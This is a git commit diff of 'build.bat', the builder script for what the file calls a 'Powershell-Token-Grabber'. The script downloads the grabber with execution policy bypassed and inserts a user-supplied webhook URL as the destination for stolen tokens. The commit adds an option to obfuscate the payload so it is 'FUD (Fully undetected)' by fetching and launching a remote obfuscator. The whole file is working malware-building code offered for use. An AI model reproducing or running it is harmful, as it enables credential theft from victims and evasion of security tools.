3d6d538ba8af585d99e37ab7952f5ebfdc2ea876
kdot227 <damndc227@gmail.com>
2023-04-04 21:47:32 -0500

    finish builder

--- build.bat
+++ build.bat
@@ -9,14 +9,9 @@ if %errorlevel% == 1 ( set "file=bat" ) else ( set "file=ps1" )
 set "urled=https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.%file%"
 
 echo Building bat file...
-if not exist main.%file% (
-    echo main.%file% not found!
-    goto :make_file
-) else (
-    echo Downloading main.%file% from %urled%...
-    ::now I could technically do ALL of this in batch but ion feel suicidal today
-    powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "(Invoke-WebRequest -Uri '%urled%' -UseBasicParsing).Content | Set-Content main.%file%"
-)
+echo Downloading main.%file% from %urled%...
+::now I could technically do ALL of this in batch but ion feel suicidal today
+powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "(Invoke-WebRequest -Uri '%urled%' -UseBasicParsing).Content | Set-Content main.%file%"
 
 echo Enter webhook URL:
 set /p url="URL: "
@@ -24,6 +19,24 @@ set /p url="URL: "
 set "batch_path=%~dp0\main.%file%"
 
 powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "(Get-Content %batch_path%) -replace 'YOUR_WEBHOOK_HERE', '%url%' | Set-Content %batch_path%"
+
+echo Would you like to obfuscate and make it FUD (Fully undetected)? (y/n)
+choice /C yn /M "Select an option:" /N
+
+if %errorlevel% == 1 ( goto :obfuscate ) else ( goto :eof )
+
+:obfuscate
+echo Downloading Obfuscator. It requires python so if you don't have it, it won't work. The obfuscator link is https://github.com/somalifuscator. This ONLY WORKS for the batch file. Otherwise use Invoke-Obfuscation
+timeout /t 7
+echo downloading somalifuscator
+powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-BitsTransfer -Source 'https://github.com/KDot227/Somalifuscator/archive/refs/heads/main.zip' -Destination 'somalifuscator.zip' -TransferType Download -Priority Foreground"
+echo extracting somalifuscator
+powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Expand-Archive somalifuscator.zip"
+set "somalifuscator_path=%~dp0Somalifuscator\Somalifuscator-main"
+del /f /q somalifuscator.zip
+echo obfuscating
+start %somalifuscator_path%\setup.bat
+exit /b 0
 
 echo finished
 pause
